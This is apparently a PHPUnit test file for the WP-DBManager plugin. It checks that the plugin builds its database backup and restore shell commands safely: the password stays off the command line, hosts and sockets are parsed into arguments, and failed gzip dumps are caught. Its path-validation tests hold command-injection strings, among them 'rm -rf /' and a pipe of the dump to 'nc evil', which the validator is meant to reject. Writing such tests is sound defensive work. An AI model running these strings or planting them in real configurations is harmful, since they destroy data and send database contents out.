<?php
/**
 * Command construction and the backup/restore round trip.
 *
 * @package WP-DBManager
 */

/**
 * The commands this plugin hands to a shell.
 *
 * These were built inline in three places before 3.0.0 and had already
 * drifted, so the point of most of these tests is that there is now one
 * construction to check.
 */
class Test_DBManager_Database extends DBManager_TestCase {

	/**
	 * The password never appears on the command line.
	 *
	 * It goes into a 0600 option file instead, because anything on the command
	 * line is visible to every other user on the host through `ps`.
	 */
	public function test_password_is_not_in_the_command() {
		$defaults_file = DBManager_Database::write_defaults_file();

		$this->assertNotFalse( $defaults_file, 'No option file could be written.' );

		$command = DBManager_Database::dump_command( $this->backup_dir . '/out.sql', false, $defaults_file );

		$this->assertStringContainsString( '--defaults-extra-file=', $command );
		$this->assertStringNotContainsString( '--password=', $command );

		if ( '' !== DB_PASSWORD ) {
			$this->assertStringNotContainsString( DB_PASSWORD, $command );
		}

		DBManager_Database::delete_defaults_file( $defaults_file );
	}

	/**
	 * The option file is written unreadable to anyone else, then cleaned up.
	 */
	public function test_defaults_file_is_private_and_removed() {
		$defaults_file = DBManager_Database::write_defaults_file();

		$this->assertFileExists( $defaults_file );
		$this->assertSame( '0600', substr( sprintf( '%o', fileperms( $defaults_file ) ), -4 ) );
		$this->assertStringContainsString( '[client]', file_get_contents( $defaults_file ) ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_get_contents

		DBManager_Database::delete_defaults_file( $defaults_file );

		$this->assertFileDoesNotExist( $defaults_file );
	}

	/**
	 * With no option file the command falls back to --password.
	 */
	public function test_credential_args_fall_back_to_the_command_line() {
		$this->assertStringContainsString( '--defaults-extra-file=', DBManager_Database::credential_args( '/tmp/x' ) );
		$this->assertStringContainsString( '--password=', DBManager_Database::credential_args( false ) );
	}

	/**
	 * Values in the option file are quoted and their backslashes doubled.
	 */
	public function test_option_file_values_are_escaped() {
		$this->assertSame( '"plain"', DBManager_Database::escape_option_file_value( 'plain' ) );
		$this->assertSame( '"a\\\\b"', DBManager_Database::escape_option_file_value( 'a\\b' ) );
		$this->assertSame( '"a\\"b"', DBManager_Database::escape_option_file_value( 'a"b' ) );
	}

	/**
	 * The gzip branch pipes, the plain branch redirects.
	 */
	public function test_dump_command_branches() {
		$plain = DBManager_Database::dump_command( $this->backup_dir . '/out.sql', false, false );
		$gzip  = DBManager_Database::dump_command( $this->backup_dir . '/out.sql.gz', true, false );

		$this->assertStringNotContainsString( '| gzip', $plain );
		$this->assertStringContainsString( '| gzip >', $gzip );

		foreach ( array( $plain, $gzip ) as $command ) {
			$this->assertStringContainsString( '--add-drop-table', $command );
			$this->assertStringContainsString( '--skip-lock-tables', $command );
			$this->assertStringContainsString( 'utf8mb4', $command );
		}
	}

	/**
	 * A gzipped backup is decompressed into the client, not read by it.
	 */
	public function test_restore_command_branches() {
		$plain = DBManager_Database::restore_command( $this->backup_dir . '/in.sql', false );
		$gzip  = DBManager_Database::restore_command( $this->backup_dir . '/in.sql.gz', false );

		$this->assertStringStartsWith( 'gunzip <', $gzip );
		$this->assertStringNotContainsString( 'gunzip', $plain );
		$this->assertStringContainsString( ' < ', $plain );
	}

	/**
	 * The documented action still fires before a command is assembled.
	 */
	public function test_before_escapeshellcmd_action_fires() {
		$fired = 0;

		add_action(
			'wp_dbmanager_before_escapeshellcmd',
			function () use ( &$fired ) {
				++$fired;
			}
		);

		DBManager_Database::dump_command( $this->backup_dir . '/out.sql', false, false );
		DBManager_Database::restore_command( $this->backup_dir . '/in.sql', false );

		$this->assertSame( 2, $fired );
	}

	/**
	 * A host with a port is split into --port, a socket into --socket.
	 */
	public function test_connection_args_are_derived_from_db_host() {
		$args = DBManager_Database::connection_args();

		$this->assertArrayHasKey( 'host', $args );
		$this->assertArrayHasKey( 'port', $args );
		$this->assertArrayHasKey( 'sock', $args );

		if ( false !== strpos( DB_HOST, ':' ) ) {
			$parts = explode( ':', DB_HOST );

			$this->assertSame( $parts[0], $args['host'] );
			$this->assertNotSame( '', $args['port'] . $args['sock'] );
		} else {
			$this->assertSame( DB_HOST, $args['host'] );
			$this->assertSame( '', $args['port'] );
			$this->assertSame( '', $args['sock'] );
		}
	}

	/**
	 * Paths carrying shell metacharacters are rejected.
	 *
	 * @dataProvider data_paths
	 *
	 * @param string $path     Path to judge.
	 * @param int    $expected 1 when acceptable.
	 */
	public function test_is_valid_path( $path, $expected ) {
		$this->assertSame( $expected, DBManager_Database::is_valid_path( $path ) );
	}

	/**
	 * Paths and their verdicts.
	 *
	 * @return array
	 */
	public function data_paths() {
		return array(
			array( '/usr/bin/mysqldump', 1 ),
			array( 'mysqldump.exe', 1 ),
			array( 'C:/Program Files/MySQL/bin/mysqldump.exe', 1 ),
			array( '/usr/bin/mysqldump; rm -rf /', 0 ),
			array( '/usr/bin/mysqldump | nc evil 1', 0 ),
			array( '/usr/bin/mysqldump > /tmp/x', 0 ),
			array( '/usr/bin/mysql "quoted"', 0 ),
			array( '/usr/bin/mysql?', 0 ),
		);
	}

	/**
	 * Each of the three paths is reported on independently.
	 */
	public function test_path_errors_are_reported_separately() {
		$options                  = DBManager_Options::get();
		$options['path']          = '/no/such/place';
		$options['mysqldumppath'] = 'mysqldump; id';
		$options['mysqlpath']     = 'mysql | id';
		update_option( DBManager_Options::OPTION, $options );

		$this->assertCount( 3, DBManager_Database::path_errors() );
	}

	/**
	 * A healthy configuration reports nothing.
	 */
	public function test_path_errors_is_empty_when_everything_is_fine() {
		$this->assertSame( array(), DBManager_Database::path_errors() );
	}

	/**
	 * A backup really runs, produces a real dump, and gets its checksum name.
	 *
	 * @group requires-mysqldump
	 */
	public function test_backup_produces_a_checksummed_dump() {
		if ( ! is_executable( $this->mysqldump_path() ) ) {
			$this->markTestSkipped( 'mysqldump is not available in this environment.' );
		}

		$result = DBManager_Database::backup( false );

		$this->assertTrue( $result['success'], 'The backup reported failure.' );
		$this->assertFileExists( $result['filepath'] );
		$this->assertGreaterThan( 0, filesize( $result['filepath'] ) );

		// The name carries the file's own md5, so it cannot be guessed.
		$this->assertSame(
			md5_file( $result['filepath'] ),
			substr( basename( $result['filepath'] ), 0, 32 )
		);

		$this->assertStringContainsString( 'CREATE TABLE', file_get_contents( $result['filepath'] ) ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_get_contents
	}

	/**
	 * A gzipped backup is really gzip.
	 *
	 * @group requires-mysqldump
	 */
	public function test_gzip_backup_is_compressed() {
		if ( ! is_executable( $this->mysqldump_path() ) ) {
			$this->markTestSkipped( 'mysqldump is not available in this environment.' );
		}

		$result = DBManager_Database::backup( true );

		$this->assertTrue( $result['success'] );
		$this->assertStringEndsWith( '.sql.gz', $result['filepath'] );

		// The gzip magic number.
		$handle = fopen( $result['filepath'], 'rb' ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fopen
		$magic  = fread( $handle, 2 ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fread
		fclose( $handle ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fclose

		$this->assertSame( "\x1f\x8b", $magic );
	}

	/**
	 * A dump that fails leaves no file behind pretending to be a backup.
	 *
	 * An empty file is worse than no file: it looks like a backup right up
	 * until somebody needs it.
	 */
	public function test_a_failed_dump_leaves_nothing_behind() {
		$options                  = DBManager_Options::get();
		$options['mysqldumppath'] = '/nonexistent/mysqldump';
		update_option( DBManager_Options::OPTION, $options );

		$result = DBManager_Database::backup( false );

		$this->assertFalse( $result['success'] );
		$this->assertSame( '', $result['filepath'] );
		$this->assertSame( array(), DBManager_Backups::all( $this->backup_dir ) );
	}

	/**
	 * A failed *gzipped* dump is caught too.
	 *
	 * This is the one a size check misses. `mysqldump ... | gzip > file` reports
	 * gzip's exit status, not mysqldump's, and gzip turns empty input into a
	 * valid twenty byte stream - so a dump that never ran produced a non-empty
	 * file, an exit status of zero, and got renamed and e-mailed as a backup.
	 * Gzip has been the default since 3.0.0, so this was the common case.
	 */
	public function test_a_failed_gzip_dump_leaves_nothing_behind() {
		$options                  = DBManager_Options::get();
		$options['mysqldumppath'] = '/nonexistent/mysqldump';
		update_option( DBManager_Options::OPTION, $options );

		$result = DBManager_Database::backup( true );

		$this->assertFalse( $result['success'], 'An empty gzip stream was accepted as a backup.' );
		$this->assertSame( 'empty', $result['reason'] );
		$this->assertSame( array(), DBManager_Backups::all( $this->backup_dir ) );
	}

	/**
	 * A gzipped dump that really has content is accepted.
	 *
	 * The guard above must not be so strict that it throws away good backups.
	 *
	 * @group requires-mysqldump
	 */
	public function test_a_real_gzip_dump_is_accepted() {
		if ( ! is_executable( $this->mysqldump_path() ) ) {
			$this->markTestSkipped( 'mysqldump is not available in this environment.' );
		}

		$result = DBManager_Database::backup( true );

		$this->assertTrue( $result['success'] );
		$this->assertStringContainsString( 'CREATE TABLE', (string) gzdecode( file_get_contents( $result['filepath'] ) ) ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_get_contents
	}

	/**
	 * A restore against an unusable path reports rather than pretending.
	 */
	public function test_restore_refuses_an_invalid_configuration() {
		$options              = DBManager_Options::get();
		$options['mysqlpath'] = 'mysql; id';
		update_option( DBManager_Options::OPTION, $options );

		$result = DBManager_Database::restore( 'whatever.sql' );

		$this->assertFalse( $result['ran'] );
		$this->assertNotEmpty( $result['errors'] );
	}
}
